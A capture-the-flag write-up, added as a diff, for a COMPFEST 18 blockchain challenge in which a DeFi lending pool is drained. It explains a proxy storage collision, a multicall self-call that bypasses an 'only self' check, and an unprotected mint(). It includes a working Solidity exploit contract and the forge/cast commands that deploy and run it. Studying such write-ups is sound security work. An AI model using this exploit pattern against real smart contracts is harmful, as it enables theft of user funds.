@@ -1,0 +1,198 @@
+---
+title: 'COMPFEST 18 - The Timekeeper''s Paradox'
+description: 'Draining a lending pool through a proxy storage collision that aliases pendingAdmin onto the oracle price, reachable via an unpermissioned multicall self-call'
+date: 2026-08-30
+tags: ['writeup', 'blockchain', 'smart-contracts', 'solidity', 'storage-collision', 'oracle-attack', 'compfest', '2026']
+authors: ['kudaliar']
+draft: false
+---
+
+A layered DeFi protocol — governance token, price oracle, upgradeable proxy, lending pool — whose "paradox" is a storage collision that exists before you touch anything. The governance path is a decoy; the real drain needs neither quorum nor timelock.
+
+## Challenge Description
+
+> Deep within the blockchain, the **Timekeeper Protocol** governs a DeFi ecosystem — a governance token, a price oracle, an upgradeable proxy, and a lending pool. The protocol's architects believed their layered architecture would keep funds safe. The lending pool holds **50 ETH**. You've been given a small allocation of governance tokens. Can you find the paradox in time?
+
+Goal: `Setup.isSolved()` returns true when `address(lending).balance == 0`.
+
+## Initial Analysis
+
+Five contracts, wired together in `Setup.sol`:
+
+```text
+TimekeeperToken (TKG)  ──┐
+                         ├──> TimekeeperLending  (holds 50 ETH + 500k TKG)
+TimekeeperOracle ──> TimekeeperProxy ──┘        (reads price from the PROXY)
+                         └──> TimekeeperGovernance (7d timelock, 51% quorum)
+```
+
+The player starts with 10,000 TKG (1% of supply) and 5 ETH for gas. The deployer keeps 400,000 TKG, so the 51% governance quorum is — by design — out of reach.
+
+The obvious-looking path is governance: capture a proposal, `upgradeTo()` a malicious oracle implementation, re-price the collateral, drain. That path is a decoy. It needs 51% of supply, a 7-day timelock, *and* the target implementation to already be in `validImplementations`. None of it is necessary.
+
+### Recon: the price is already wrong
+
+First thing worth doing on a live instance is asking both the oracle and the pool what the price is:
+
+```console
+$ cast call $ORACLE  'getLatestPrice()(uint256)' --rpc-url $RPC
+1000000000000000000000        # 1000e18 — what the oracle thinks
+
+$ cast call $LENDING 'getOraclePrice()(uint256)'  --rpc-url $RPC
+0                             # what the lending pool actually reads
+```
+
+The oracle says 1000 TKG/ETH. The lending pool — which calls the *proxy* — reads **0**. That disagreement is the paradox, and it exists before we touch anything.
+
+### Why: storage collision across the delegatecall
+
+`TimekeeperLending.getOraclePrice()` staticcalls the proxy, which has no `getLatestPrice()` of its own, so the `fallback()` `delegatecall`s into the oracle. Under `delegatecall` the implementation's code executes against the **proxy's** storage — and the two layouts do not line up:
+
+| slot | `TimekeeperProxy`         | `TimekeeperOracle`   |
+|:----:|---------------------------|----------------------|
+| 0    | `admin`                   | `admin`              |
+| 1    | `implementation`          | `reporter`           |
+| 2    | **`pendingAdmin`**        | **`latestPrice`**    |
+| 3    | `validImplementations`    | `observations`       |
+
+`getLatestPrice()` compiles to "load slot 2". Executed against the proxy, that returns `uint256(uint160(pendingAdmin))` — initially `address(0)`, hence a price of 0.
+
+Note what this means: `reportPrice()`, `consultTWAP()`, `MIN_OBSERVATION_WINDOW`, the whole TWAP machinery in the oracle writes to storage **nobody reads**. The pool's oracle is, in effect, a single `address` field on the proxy.
+
+Two red herrings die here too:
+
+- The oracle keeps a second copy of the price at `keccak256("timekeeper.oracle.price")` via `getPrice()`/`_setNamedPrice()`. Nothing reads it.
+- The proxy declares the EIP-1967 `IMPLEMENTATION_SLOT` and keeps it in sync — but its `fallback()` reads the plain `implementation` variable at slot 1, not the 1967 slot.
+
+## The Vulnerability
+
+### Bug 1 — multicall() lets the proxy call itself
+
+Slot 2 is `pendingAdmin`, so the price is whatever `setPendingAdmin()` last wrote. That setter looks locked down:
+
+```solidity
+function setPendingAdmin(address _pendingAdmin) external {
+    require(msg.sender == address(this), "Only self");   // governance-only, supposedly
+    pendingAdmin = _pendingAdmin;
+}
+```
+
+Only the proxy itself may call it. But the proxy hands out exactly that capability, to anyone:
+
+```solidity
+function multicall(bytes[] calldata data) external returns (bytes[] memory results) {
+    for (uint256 i = 0; i < data.length; i++) {
+        (bool success, bytes memory result) = address(this).call(data[i]);  // msg.sender == proxy
+        require(success, "Multicall: call failed");
+    }
+}
+```
+
+`multicall` is unpermissioned and performs a real `CALL` back into the proxy, so inside `setPendingAdmin` the check `msg.sender == address(this)` passes. `multicall` is also a *declared* function on the proxy, so the dispatcher handles it directly and it never reaches the delegating fallback.
+
+**Anyone can set the lending pool's oracle price to any address-shaped value, in one call, with no governance, no quorum, and no timelock.** Setting `pendingAdmin = address(0x1)` makes the price `1`.
+
+### Bug 2 — mint() has no access control
+
+```solidity
+function mint(address to, uint256 amount) external {   // no owner, no onlyMinter
+    totalSupply += amount;
+    balanceOf[to] += amount;
+}
+```
+
+Free collateral in unlimited quantity. (This alone would also hand over the 51% governance quorum — another route the price bug makes unnecessary.)
+
+## Exploitation
+
+`borrowETH` sizes the loan like this:
+
+```solidity
+collateralValueInETH = (pos.tokenCollateral * 1e18) / price;
+maxBorrow            = (collateralValueInETH * RATIO_PRECISION) / COLLATERAL_RATIO;  // 100/150
+```
+
+`price` sits in the **denominator**, so driving it *down* inflates collateral. At the honest price of `1000e18`, borrowing 50 ETH would need 75,000 TKG. At `price = 1`, depositing 1,000,000 TKG is valued at `1e6 * 1e18 * 1e18 / 1 = 1e42` wei ≈ 1e24 ETH. The 150% collateral check is satisfied by twenty-four orders of magnitude.
+
+Note the price *must* be non-zero for this to work — at the default price of 0 the pool is accidentally safe (`maxBorrow` collapses to 0 and every borrow reverts). We are not lowering the price; we are the first party to ever set it.
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+contract Exploit {
+    function pwn(address setupAddr, address payable receiver) external {
+        ISetup setup   = ISetup(setupAddr);
+        IToken token   = IToken(setup.token());
+        IProxy proxy   = IProxy(setup.proxy());
+        ILending lend  = ILending(setup.lending());
+
+        // 1. proxy.pendingAdmin (slot 2) is read as oracle.latestPrice (slot 2).
+        //    setPendingAdmin() requires msg.sender == address(this) — multicall()
+        //    calls back into the proxy, so the proxy is the caller.
+        bytes[] memory calls = new bytes[](1);
+        calls[0] = abi.encodeWithSignature("setPendingAdmin(address)", address(uint160(1)));
+        proxy.multicall(calls);
+        require(lend.getOraclePrice() == 1, "price not set");
+
+        // 2. TimekeeperToken.mint() has no access control.
+        token.mint(address(this), 1_000_000 ether);
+        token.approve(address(lend), type(uint256).max);
+        lend.depositToken(1_000_000 ether);
+
+        // 3. price == 1 => collateral is worth ~1e24 ETH. Take the whole pool.
+        lend.borrowETH(address(lend).balance);
+
+        (bool ok, ) = receiver.call{value: address(this).balance}("");
+        require(ok, "payout failed");
+        require(setup.isSolved(), "not solved");
+    }
+
+    receive() external payable {}
+}
+```
+
+```console
+$ forge create src/Exploit.sol:Exploit --rpc-url $RPC --private-key $PK --broadcast
+Deployed to: 0x9C0609604900bA41dc6B293fd7FC1eEC0de9A9E0
+
+$ cast send $EXPLOIT "pwn(address,address)" $SETUP $PLAYER --rpc-url $RPC --private-key $PK
+status   1 (success)
+gasUsed  200114
+
+$ cast call $SETUP 'isSolved()(bool)' --rpc-url $RPC
+true
+```
+
+Before → after:
+
+| | before | after |
+|---|---|---|
+| `lending.getOraclePrice()` | 0 | 1 |
+| pool ETH balance | 50 ETH | **0** |
+| player ETH | 5 ETH | ~55 ETH |
+
+One transaction, 200k gas. No governance, no timelock, no flash loan.
+
+```console
+$ curl -s -b cj.txt http://34.2.147.230:8503/flag
+{"flag":"COMPFEST18{t1m3k33p3r_pr1c3_0r4cl3_m4n1p_v14_st0r4g3_c0ll1s10n_le4k3dddddd_n0000000}"}
+```
+
+## What was decoration
+
+The challenge is mostly misdirection, and naming the decoys is half the solve:
+
+- **Governance** (51% quorum + 7-day timelock, "can you find the paradox *in time?*") — never touched.
+- **`upgradeTo()` / `validImplementations`** — the intended-looking proxy attack, unnecessary.
+- **TWAP** (`observations`, `consultTWAP`, `MIN_OBSERVATION_WINDOW`) — writes storage nothing reads.
+- **`flashloan()`** — a genuine reentrancy handle (`_flashloanActive` is never reset on the revert path, and the callback happens before the balance check), but no manipulation is needed once the price is a free variable.
+- **The second price copy** at `keccak256("timekeeper.oracle.price")` — unread.
+- **The EIP-1967 slot** — kept in sync, but the fallback dispatches on slot 1.
+- **`reporter` / `setReporter`** — controlling the reporter is worthless; `reportPrice` writes to the oracle's own storage, which the pool never reads.
+
+## Flag
+
+```text
+COMPFEST18{t1m3k33p3r_pr1c3_0r4cl3_m4n1p_v14_st0r4g3_c0ll1s10n_le4k3dddddd_n0000000}
+```
